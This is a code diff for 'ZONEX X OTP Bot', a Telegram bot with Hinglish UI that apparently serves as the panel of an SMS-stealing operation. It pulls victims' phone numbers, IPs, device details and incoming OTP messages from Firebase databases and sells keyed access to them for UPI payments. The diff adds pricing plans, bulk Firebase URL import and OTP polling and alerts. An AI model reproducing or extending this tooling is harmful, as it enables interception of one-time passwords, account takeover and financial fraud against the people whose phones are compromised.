+        f"📡 Network  ›  <code>{network}</code>\n"
+        f"🌐 IP       ›  <code>{ip}</code>\n"
+        f"🕐 Last Seen›  <code>{last_seen}</code>\n"
+        f"🔥 DB       ›  <code>{label}</code>\n\n"
+        f"<b>🔑 Latest OTP</b>\n{'─'*28}"
+    )
+
+    lines = [header]
+    if otps:
+        e = otps[0]
+        lines.append(
+            f"\n  ⚡ <b><code>{e['otp']}</code></b>\n"
+            f"  📤 <i>{e['sender']}</i>\n"
+            f"  🕐 {e['time']}"
+        )
+    else:
+        lines.append("\n  ❌ <i>Koi recent OTP nahi mila</i>")
+    return "".join(lines)
+
+def txt_otp_alert(label: str, dev_id: str, e: dict, info: dict) -> str:
     return (
-        f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
-        f"📱 <b>𝐃𝐄𝐕𝐈𝐂𝐄 𝐈𝐍𝐅𝐎</b>\n"
-        f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
-        f"╭──────────────────────╮\n"
-        f"📞 Number   › <code>{phone}</code>\n"
-        f"🔋 Battery  › {info.get('battery','—')}\n"
-        f"🤖 Android  › {info.get('android','—')}\n"
-        f"📡 Network  › {info.get('network','—')}\n"
-        f"🌐 IP       › <code>{info.get('ip','—')}</code>\n"
-        f"🕐 Last Seen › {info.get('last_seen','—')}\n"
-        f"🔥 Database › {label}\n"
-        f"╰──────────────────────╯\n\n" +
-        (f"╭━━━ 🔑 <b>𝐋𝐀𝐓𝐄𝐒𝐓 𝐎𝐓𝐏</b> ━━━╮\n"
-         f"⚡ CODE   › <code>{otps[0]['otp']}</code>\n"
-         f"📤 Sender › {otps[0]['sender']}\n"
-         f"🕐 Time   › {otps[0]['time']}\n"
-         f"╰━━━━━━━━━━━━━━━━━━━━━━╯" if otps else "\n❌ <i>Koi recent OTP nahi mila</i>")
+        f"⚡ <b>OTP ALERT</b> ⚡\n"
+        f"{'━'*30}\n\n"
+        f"🔢  <b><code>{e['otp']}</code></b>\n\n"
+        f"{'━'*30}\n"
+        f"📞 <code>{_normalize_phone(info.get('phone','—'))}</code>\n"
+        f"📤 {e['sender']}\n"
+        f"🕐 {e['time']}\n"
+        f"{'─'*30}\n"
+        f"💬 <i>{e['msg'][:200]}{'…' if len(e['msg'])>200 else ''}</i>\n"
+        f"{'━'*30}\n"
+        f"🤖 <b>ZONEX X OTP Bot</b>  ·  {BOT_DEV}"
     )
 
 def txt_user_panel(uid: int) -> str:
@@ -676,6 +738,30 @@ def txt_user_panel(uid: int) -> str:
         f"{'─'*28}\n"
         f"<i>Key kabhi nahi badlegi — sirf tumhari hai 🔒</i>"
     )
+
+def txt_plans() -> str:
+    plans = data.get("pricing_plans",[])
+    upi   = data.get("upi_id","")
+    if not plans:
+        return f"💰 Koi plan nahi hai abhi.\n👑 Contact: {ADMIN_USERNAME}"
+    lines = ["💰 <b>Buy Key — Plans</b>\n","━"*28,"\n\n"]
+    for p in plans:
+        h = int(p['hours'])
+        if h >= 720:
+            dur = f"{h//720} Month"
+        elif h >= 168:
+            dur = f"{h//168} Week"
+        elif h >= 24:
+            dur = f"{h//24} Din"
+        else:
+            dur = f"{h}h"
+        lines.append(f"📦 <b>{dur}</b>  —  ⏱{h}h  —  💵 <b>₹{p['price']}</b>\n")
+    lines.append(f"\n{'─'*28}\n")
+    if upi:
+        lines.append(f"💳 <b>UPI ID:</b> <code>{upi}</code>\n\n")
+    lines += [f"<i>Payment ke baad admin ko screenshot bhejo.</i>\n",
+              f"👑 {ADMIN_USERNAME}"]
+    return "".join(lines)
 
 def txt_stats() -> str:
     active = sum(1 for s, u in data["users"].items() if has_access(int(s)))
@@ -700,23 +786,16 @@ def txt_stats() -> str:
 def txt_expired(name: str) -> str:
     rh = get_referral_hours()
     return (
-        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"⏰ <b>𝐀𝐂𝐂𝐄𝐒𝐒 𝐄𝐗𝐏𝐈𝐑𝐄𝐃</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"😔 Arre <b>{name}</b>,\n"
-        f"   tumhara time khatam ho gaya!\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"💎 <b>𝐂𝐇𝐎𝐎𝐒𝐄 𝐘𝐎𝐔𝐑 𝐎𝐏𝐓𝐈𝐎𝐍</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"💰 <b>𝐁𝐔𝐘 𝐊𝐄𝐘</b>\n"
-        f"   Plan kharido, turant access milega.\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"👥 <b>𝐑𝐄𝐅𝐄𝐑 & 𝐄𝐀𝐑𝐍</b>\n"
-        f"   Ek dost = FREE +{int(rh)} hour access! 🎁\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🔗 Refer link ke liye 👇\n"
-        f"   neeche button dabao!\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━"
+        f"⏰ <b>Access Khatam!</b>\n"
+        f"{'━'*28}\n\n"
+        f"Arre <b>{name}</b>, tumhara time khatam ho gaya! 😔\n\n"
+        f"<b>Wapas aane ke 2 tarike:</b>\n\n"
+        f"💰 <b>Buy Key</b>\n"
+        f"   Plan kharido, turant access milega\n\n"
+        f"👥 <b>Refer & Earn</b>\n"
+        f"   Ek dost = FREE <b>+{rh:.0f}h</b> access! Bilkul free!\n"
+        f"{'─'*28}\n"
+        f"<i>Refer link ke liye 👇 button dabao</i>"
     )
 
 # ─── Keyboards ────────────────────────────────────────────────────────────────
@@ -744,10 +823,11 @@ def kb_online(devices: list, page: int) -> InlineKeyboardMarkup:
     for i in range(0, len(chunk), 2):
         row = []
         for lb, did, info in chunk[i:i+2]:
-            ph = info.get("phone") or "—"
-            ph_short = ph if ph != "—" else f"ID:{did[-6:]}"
+            cnt  = len(otp_cache.get(lb,{}).get(did,[]))
+            ph   = _normalize_phone(info.get("phone","—"))
+            ph_short = ph[-10:] if ph != "—" else "—"
             esc  = lb.replace(":","_")
-            row.append(InlineKeyboardButton(f"🟢 {ph_short}",
+            row.append(InlineKeyboardButton(f"🟢 {ph_short} [{cnt}🔑]",
                                             callback_data=f"dev:{esc}:{did}:{page}"))
         rows.append(row)
     nav, total = [], max(1,(len(devices)+DEVICES_PER_PAGE-1)//DEVICES_PER_PAGE)
@@ -822,12 +902,17 @@ def kb_admin() -> InlineKeyboardMarkup:
     ])
 
 def _fb_online_count(label: str) -> int:
-    return sum(1 for d in device_cache.get(label, {}).values() if d.get("online"))
+    """Online device count for one Firebase label."""
+    return sum(
+        1 for d in device_cache.get(label, {}).values()
+        if d.get("online") and _has_valid_phone(d)
+    )
 
 def _fb_total_count(label: str) -> int:
     return len(device_cache.get(label, {}))
 
 def txt_firebase_panel() -> str:
+    """Detailed Firebase management panel text."""
     total_on  = count_online()
     total_dev = count_total()
     total_dbs = len(data["firebase_configs"])
@@ -941,14 +1026,11 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     all_joined, missing = await check_channels(ctx.bot, uid)
     if not all_joined:
         await update.message.reply_text(
-            f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
-            f"🤖  <b>𝐙𝐎𝐍𝐄𝐗 𝐗 𝐎𝐓𝐏 𝐁𝐎𝐓</b>\n"
-            f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
-            f"👋 Welcome <b>{name}</b>!\n\n"
-            f"🔒 <b>𝐁𝐎𝐓 𝐀𝐂𝐂𝐄𝐒𝐒 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃</b>\n\n"
+            f"🤖 <b>ZONEX X OTP Bot</b>\n"
+            f"{'━'*28}\n\n"
+            f"👋 <b>Welcome {name}!</b>\n\n"
             f"Bot use karne ke liye pehle\n"
-            f"yeh channels join karo 👇\n\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━",
+            f"yeh channels join karo 👇",
             parse_mode="HTML",
             reply_markup=kb_channels(missing)
         )
@@ -971,29 +1053,23 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             try:
                 await ctx.bot.send_message(
                     ref_uid,
-                    f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
-                    f"🎉  <b>𝐑𝐄𝐅𝐄𝐑𝐑𝐀𝐋 𝐁𝐎𝐍𝐔𝐒</b>\n"
-                    f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
-                    f"✅ Referral Joined Successfully!\n"
-                    f"⏱️ Bonus Added › +{int(rh)} hour\n\n"
-                    f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                    f"🎁 <b>𝐅𝐑𝐄𝐄 𝐀𝐂𝐂𝐄𝐒𝐒 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃!</b>\n"
-                    f"⚡ +{int(rh)} hour Added to Your Account",
+                    f"🎉 <b>Referral Bonus!</b>\n\n"
+                    f"Tumhare referral <b>{name}</b> ne join kar liya!\n"
+                    f"⏱ <b>+{rh:.0f} Hour</b> add hua tumhare account mein!",
                     parse_mode="HTML"
                 )
             except: pass
 
         await update.message.reply_text(
-            f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
-            f"🎉  <b>𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐙𝐎𝐍𝐄𝐗 𝐎𝐓𝐏!</b>\n"
-            f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
-            f"🎁 <b>{WELCOME_HOURS} HOUR FREE ACCESS!</b>\n\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"🗝 <b>𝐘𝐎𝐔𝐑 𝐏𝐄𝐑𝐌𝐀𝐍𝐄𝐍𝐓 𝐊𝐄𝐘:</b>\n\n"
+            f"🎉 <b>Welcome to ZONEX X OTP Bot!</b>\n"
+            f"{'━'*28}\n\n"
+            f"🎁 <b>{WELCOME_HOURS} Hour FREE access mila!</b>\n\n"
+            f"{'─'*28}\n"
+            f"🗝 <b>Tumhari Permanent Key:</b>\n\n"
             f"<code>{key}</code>\n\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"👇 Copy Key & Send It Here\n"
-            f"⚡ Panel Opens Instantly!",
+            f"{'─'*28}\n"
+            f"👆 <b>Upar se key copy karo aur yahan bhejo</b>\n"
+            f"<i>Panel turant khul jaayega ⚡</i>",
             parse_mode="HTML"
         )
         return WAIT_KEY
@@ -1050,7 +1126,7 @@ async def handle_key_entry(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(
         f"✅ <b>Key Verified!</b> Panel khul gaya 🎉\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"{'━'*28}\n\n"
         + txt_welcome_panel(name, uid),
         reply_markup=kb_main(uid),
         parse_mode="HTML"
@@ -1128,16 +1204,15 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             save_data(data)
             key = get_key(uid)
             await q.edit_message_text(
-                f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
-                f"🎉  <b>𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐙𝐎𝐍𝐄𝐗 𝐎𝐓𝐏!</b>\n"
-                f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
-                f"🎁 <b>{WELCOME_HOURS} HOUR FREE ACCESS!</b>\n\n"
-                f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"🗝 <b>𝐘𝐎𝐔𝐑 𝐏𝐄𝐑𝐌𝐀𝐍𝐄𝐍𝐓 𝐊𝐄𝐘:</b>\n\n"
+                f"🎉 <b>Welcome to ZONEX X OTP Bot!</b>\n"
+                f"{'━'*28}\n\n"
+                f"🎁 <b>{WELCOME_HOURS} Hour FREE access mila!</b>\n\n"
+                f"{'─'*28}\n"
+                f"🗝 <b>Tumhari Permanent Key:</b>\n\n"
                 f"<code>{key}</code>\n\n"
-                f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"👇 Copy Key & Send It Here\n"
-                f"⚡ Panel Opens Instantly!",
+                f"{'─'*28}\n"
+                f"👆 <b>Upar se key copy karo aur yahan bhejo</b>\n"
+                f"<i>Panel turant khul jaayega ⚡</i>",
                 parse_mode="HTML"
             )
             ctx.user_data["waiting_key"] = True
@@ -1151,14 +1226,9 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 try:
                     await ctx.bot.send_message(
                         ref_uid,
-                        f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
-                        f"🎉  <b>𝐑𝐄𝐅𝐄𝐑𝐑𝐀𝐋 𝐁𝐎𝐍𝐔𝐒</b>\n"
-                        f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
-                        f"✅ Referral Joined Successfully!\n"
-                        f"⏱️ Bonus Added › +{int(rh)} hour\n\n"
-                        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                        f"🎁 <b>𝐅𝐑𝐄𝐄 𝐀𝐂𝐂𝐄𝐒𝐒 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃!</b>\n"
-                        f"⚡ +{int(rh)} hour Added to Your Account",
+                        f"🎉 <b>Referral Bonus!</b>\n\n"
+                        f"Tumhara referral join ho gaya!\n"
+                        f"⏱ <b>+{rh:.0f} Hour</b> add hua!",
                         parse_mode="HTML"
                     )
                 except: pass
@@ -1236,14 +1306,9 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 "🔴 <b>Koi device online nahi</b>\n\n"
                 "<i>Devices aate hi yahan dikh jaayengi.</i>",
                 reply_markup=kb_back(), parse_mode="HTML"); return
-
         await q.edit_message_text(
-            f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
-            f"   📱 <b>𝐎𝐍𝐋𝐈𝐍𝐄 𝐃𝐄𝐕𝐈𝐂𝐄𝐒</b>\n"
-            f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
-            f"🟢 <b>𝐀𝐂𝐓𝐈𝐕𝐄</b> › <b>{len(devs)}</b> 𝐃𝐄𝐕𝐈𝐂𝐄𝐒\n"
-            f"🕐 <b>𝐒𝐘𝐍𝐂</b> › {now_dt().strftime('%H:%M:%S')}\n\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━",
+            f"📱 <b>Online Devices</b>  ·  <code>{len(devs)}</code> active\n"
+            f"<i>🕐 Sync: {now_dt().strftime('%H:%M:%S')}</i>",
             reply_markup=kb_online(devs, pg), parse_mode="HTML")
 
     elif cb.startswith("dev:"):
@@ -1274,10 +1339,12 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         except Exception as _e:
             logger.warning(f"rfr card edit: {_e}")
 
+        # ── Snapshot cache BEFORE fetch (auto_fetch keeps it current every 10s) ─
         pre_otps = otp_cache.get(lb, {}).get(did, [])
         pre_key  = (pre_otps[0]["otp"], pre_otps[0]["sender"], pre_otps[0]["time"]) \
                    if pre_otps else None
 
+        # ── Fetch fresh OTPs from Firebase ────────────────────────────────────
         fresh_otps = list(pre_otps)
         if cfg:
             try:
@@ -1288,6 +1355,9 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             except Exception as fe:
                 logger.warning(f"rfr fetch: {fe}")
 
+        # ── Decide: is the top OTP "fresh enough" to alert? ──────────────────
+        # Fresh = arrived within last 30s (by timestamp) OR is brand-new vs cache
+        # This handles 4/5/6/8-digit OTPs regardless of timestamp parse success.
         tap_time = now_dt()
         cutoff   = tap_time - timedelta(seconds=30)
 
@@ -1297,10 +1367,11 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             top_key = (top["otp"], top["sender"], top["time"])
             top_dt  = top.get("_dt")
             is_recent  = (top_dt is not None and top_dt >= cutoff)
-            is_new_otp = (top_key != pre_key)
+            is_new_otp = (top_key != pre_key)          # not in cache at tap time → new
             if is_recent or is_new_otp:
                 otp_to_show = top
 
+        # ── If nothing fresh yet, wait up to 30s for a brand-new OTP ─────────
         if otp_to_show is None and cfg:
             known_key = (fresh_otps[0]["otp"], fresh_otps[0]["sender"], fresh_otps[0]["time"]) \
                         if fresh_otps else None
@@ -1315,15 +1386,17 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                     otp_cache.setdefault(lb, {})[did] = polled
                     top     = polled[0]
                     top_key = (top["otp"], top["sender"], top["time"])
+                    # Any OTP different from what was there at tap time is brand-new
                     if top_key != known_key:
                         otp_to_show = top
                         break
 
+        # ── Send alert only if we found a fresh / new OTP ─────────────────────
         if otp_to_show:
             devinfo = device_cache.get(lb, {}).get(did, devinfo)
             try:
                 await ctx.bot.send_message(
-                    uid, txt_new_otp_alert(lb, did, otp_to_show, devinfo), parse_mode="HTML")
+                    uid, txt_otp_alert(lb, did, otp_to_show, devinfo), parse_mode="HTML")
             except Exception as ae:
                 logger.warning(f"rfr alert: {ae}")
             try:
@@ -1500,6 +1573,7 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 ]]),
                 parse_mode="HTML")
 
+    # Firebase: Delete — show confirmation first
     elif cb.startswith("fb_del:"):
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         try:
@@ -1533,6 +1607,7 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 [InlineKeyboardButton("❌ Cancel",            callback_data="fb_del_cancel")],
             ]))
 
+    # Firebase: Delete confirmed
     elif cb.startswith("fb_del_ok:"):
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         try:
@@ -1567,11 +1642,13 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         except Exception:
             pass
 
+    # Firebase: Cancel delete
     elif cb == "fb_del_cancel":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         await q.edit_message_text(
             txt_firebase_panel(), reply_markup=kb_firebase(), parse_mode="HTML")
 
+    # Firebase: Refresh all and update panel
     elif cb == "fb_refresh":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         try:
@@ -1628,6 +1705,7 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             ]]))
         ctx.user_data["fb_step"] = "bulk"
 
+    # Admin: Users
     elif cb == "adm_users":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         users = data["users"]
@@ -1650,6 +1728,7 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             ]]),
             parse_mode="HTML")
 
+    # Admin: Add/Reduce Time
     elif cb == "adm_add_time":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         await q.edit_message_text(
@@ -1668,6 +1747,7 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML")
         ctx.user_data["awaiting_add_time"] = True
 
+    # Admin: Refer Reward Hours
     elif cb == "adm_refer_hours":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         rh = get_referral_hours()
@@ -1685,6 +1765,7 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML")
         ctx.user_data["awaiting_refer_hours"] = True
 
+    # Admin: Set UPI
     elif cb == "adm_set_upi":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         upi = data.get("upi_id","") or "Set nahi hai"
@@ -1699,6 +1780,7 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML")
         ctx.user_data["awaiting_upi"] = True
 
+    # Admin: Pricing Plans
     elif cb == "adm_plans":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         await q.edit_message_text("💰 <b>Pricing Plans</b>\n\nYahan plans manage karo:",
@@ -1730,6 +1812,7 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML")
         ctx.user_data["plan_step"] = "hours"
 
+    # Admin: Broadcast
     elif cb == "adm_broadcast":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         await q.edit_message_text(
@@ -1743,6 +1826,7 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML")
         ctx.user_data["awaiting_broadcast"] = True
 
+    # Admin: Approve payment
     elif cb.startswith("pay_ok:"):
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         pay_id  = cb.split(":", 1)[1]
@@ -1782,6 +1866,7 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 ]]))
         except: pass
 
+    # Admin: Reject payment
     elif cb.startswith("pay_no:"):
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         pay_id  = cb.split(":", 1)[1]
@@ -1817,6 +1902,7 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 ]]))
         except: pass
 
+    # Admin: Set QR code
     elif cb == "adm_set_qr":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         qr = data.get("qr_file_id", "")
@@ -1831,6 +1917,7 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             ]]))
         ctx.user_data["awaiting_qr"] = True
 
+    # Admin: View pending payments
     elif cb == "adm_pending":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         pending = data.get("pending_payments", {})
@@ -1857,6 +1944,7 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 InlineKeyboardButton("◀️ Admin", callback_data="admin")
             ]]))
 
+    # Admin: Ban list
     elif cb == "adm_ban_list":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         users = data["users"]
@@ -1884,6 +1972,7 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup(rows))
 
+    # Admin: Ban/Unban toggle
     elif cb.startswith("adm_ban_toggle:"):
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         parts   = cb.split(":", 2)
@@ -1919,6 +2008,7 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup(rows))
 
+    # Admin: Maintenance toggle
     elif cb == "adm_maintenance":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         current = data.get("maintenance", False)
@@ -1932,7 +2022,7 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             pass
         active = sum(1 for s, u in data["users"].items() if has_access(int(s)))
         rh = get_referral_hours()
-        maint_line = f"\n⚙️ <b>Maintenance: {'🔴 ON' if new_state else '🟢 OFF'}</b>"
+        maint_line = f"\n⚙️ <b>Maintenance: {'🔴 ON' if new_state else '🟢 OFF'}</b>" 
         await q.edit_message_text(
             f"👑 <b>Admin Panel</b>\n{'─'*28}\n"
             f"🟢 Online : <code>{count_online()}</code>   📱 Total  : <code>{count_total()}</code>\n"
@@ -1980,22 +2070,25 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         if not is_admin(uid):
             ud.pop("fb_step", None); return
         ud.pop("fb_step")
+        # Extract all URLs from the message (any line format)
         raw_found = re.findall(
             r"https?://[a-zA-Z0-9\-]+(?:-default-rtdb)?\.firebaseio\.com(?:/[^\s]*)?",
             text)
+        # Also try lines that might be missing https://
         for line in text.splitlines():
             line = line.strip()
             if "firebaseio.com" in line and not line.startswith("http"):
                 candidate = "https://" + line
                 if re.match(r"https://[a-zA-Z0-9\-].*\.firebaseio\.com", candidate):
                     raw_found.append(candidate)
+        # Normalize all URLs (remove trailing slashes, deduplicate)
         seen_in_batch: set = set()
         existing_urls = {c["url"].rstrip("/") for c in data["firebase_configs"]}
         added, skipped, invalid = [], [], 0
         for raw_url in raw_found:
             clean_url = raw_url.rstrip("/")
             if clean_url in seen_in_batch:
-                continue
+                continue  # duplicate within this batch
             seen_in_batch.add(clean_url)
             if clean_url in existing_urls:
                 skipped.append(clean_url)
@@ -2010,10 +2103,12 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             added.append((label, clean_url))
         if added or skipped:
             save_data(data)
+        # Immediately refresh all newly added Firebase DBs in background
         for lbl, url in added:
             new_cfg = next((c for c in data["firebase_configs"] if c["url"] == url), None)
             if new_cfg:
                 asyncio.create_task(refresh_clients_only(new_cfg))
+        # Build summary
         total_processed = len(seen_in_batch) + invalid
         lines = [
             f"📦 <b>Bulk Firebase — Result</b>",
@@ -2026,7 +2121,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         ]
         if added:
             lines.append(f"\n<b>✅ Added ({len(added)}):</b>")
-            for lbl, url in added[:20]:
+            for lbl, url in added[:20]:  # show max 20
                 lines.append(f"  • <b>{lbl}</b>")
             if len(added) > 20:
                 lines.append(f"  <i>...aur {len(added)-20} zyada</i>")
@@ -2054,8 +2149,10 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         if not is_admin(uid):
             ud.pop("fb_step", None); return
         raw = text.strip().rstrip("/")
+        # Normalize: accept both with and without https://
         if not raw.startswith("http"):
             raw = "https://" + raw
+        # Validate it is a Firebase RTDB URL
         if "firebaseio.com" not in raw:
             await update.message.reply_text(
                 "❌ <b>Invalid URL!</b>\n\n"
@@ -2065,6 +2162,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 "Dobara sahi URL bhejo ya /cancel likhke chhod do.",
                 parse_mode="HTML")
             return
+        # Duplicate check
         existing_norm = {c["url"].rstrip("/") for c in data["firebase_configs"]}
         if raw in existing_norm:
             await update.message.reply_text(
@@ -2110,6 +2208,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         api_key = ud.pop("fb_api_key", "")
         ud.pop("fb_step")
         label = text.strip()[:30] or "Firebase DB"
+        # Final duplicate check (in case another was added between steps)
         existing_norm = {c["url"].rstrip("/") for c in data["firebase_configs"]}
         if new_url in existing_norm:
             await update.message.reply_text(
@@ -2118,6 +2217,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 reply_markup=InlineKeyboardMarkup([[
                     InlineKeyboardButton("🔥 Firebase List", callback_data="adm_firebase")
                 ]])); return
+        # Test connectivity before saving
         wait_msg = await update.message.reply_text(
             "⏳ <b>Firebase check ho raha hai...</b>",
             parse_mode="HTML")
@@ -2126,6 +2226,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             clients = await fb_get(new_url, "clients", api_key)
             conn_ok = isinstance(clients, dict)
             if clients is None:
+                # None typically means auth error or unreachable
                 conn_ok = False
                 conn_note = "⚠️ URL unreachable ya auth fail. Public DB ho toh bhi add kar diya gaya."
             elif not clients:
@@ -2138,6 +2239,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             conn_ok = False
             conn_note = f"⚠️ Connection test failed: <i>{str(e)[:80]}</i>"
             logger.warning(f"Firebase connectivity test [{label}]: {e}")
+        # Save regardless (admin may want to add even if currently unreachable)
         new_cfg = {"url": new_url, "label": label, "key": api_key}
         data["firebase_configs"].append(new_cfg)
         save_data(data)
@@ -2480,42 +2582,9 @@ async def error_handler(update: object, ctx: ContextTypes.DEFAULT_TYPE):
 async def auto_fetch(ctx: ContextTypes.DEFAULT_TYPE):
     await refresh_all()
 
-    # Auto Alert System (Job Queue ke through)
-    if OTP_ALERT_GROUP_ID != 0:
-        for label, devs in device_cache.items():
-            for dev_id, info in devs.items():
-                if not info.get("online"): continue
-                otps = otp_cache.get(label, {}).get(dev_id, [])
-                if otps:
-                    latest_otp = otps[0]
-                    if latest_otp.get("_dt") and (now_dt() - latest_otp["_dt"]).total_seconds() < 60:
-                        otp_key = f"{dev_id}_{latest_otp['otp']}_{latest_otp['time']}"
-                        if otp_key not in sent_otps_cache:
-                            sent_otps_cache.add(otp_key)
-                            if len(sent_otps_cache) > 1000:
-                                sent_otps_cache.clear()
-                            try:
-                                await ctx.bot.send_message(
-                                    chat_id=OTP_ALERT_GROUP_ID,
-                                    text=txt_group_otp_alert(label, dev_id, latest_otp, info),
-                                    parse_mode="HTML"
-                                )
-                            except Exception as ex:
-                                logger.warning(f"Group OTP send fail: {ex}")
-                                for admin_id in ADMIN_IDS:
-                                    try:
-                                        await ctx.bot.send_message(
-                                            admin_id,
-                                            f"⚠️ <b>Group OTP Send Failed</b>\n\n"
-                                            f"Group ID: <code>{OTP_ALERT_GROUP_ID}</code>\n"
-                                            f"Error: <code>{str(ex)[:100]}</code>\n\n"
-                                            f"<i>Check if bot is Admin in the group and Anti-Spam is OFF.</i>",
-                                            parse_mode="HTML"
-                                        )
-                                    except: pass
-
 # ─── Main ─────────────────────────────────────────────────────────────────────
 async def _on_startup(app):
+    """Load latest data from Firestore before bot starts polling."""
     await _sync_from_firebase_on_startup()
     logger.info(f"🔥 Firebase DBs: {[c['label'] for c in data['firebase_configs']]}")
     logger.info(f"👥 Total users loaded: {len(data['users'])}")
@@ -2523,12 +2592,10 @@ async def _on_startup(app):
 def main():
     if not BOT_TOKEN:
         logger.error("❌ BOT_TOKEN not set!"); return
-    logger.info("🚀 ZONEX X OTP Bot v9.1 starting...")
+    logger.info("🚀 ZONEX X OTP Bot v4.6 starting...")
     logger.info(f"👑 Admins: {ADMIN_IDS}")
     logger.info(f"📢 Channels: {CHANNELS}")
     logger.info(f"🔥 Firebase Project: {FS_PROJECT}")
-    
-    # ✅ FIXED LINE (No Syntax Error)
     logger.info(f"🔑 API Key: {GAPI_KEY[:15]}..." if GAPI_KEY else "❌ API Key NOT SET!")
 
     app = Application.builder().token(BOT_TOKEN).post_init(_on_startup).concurrent_updates(True).build()
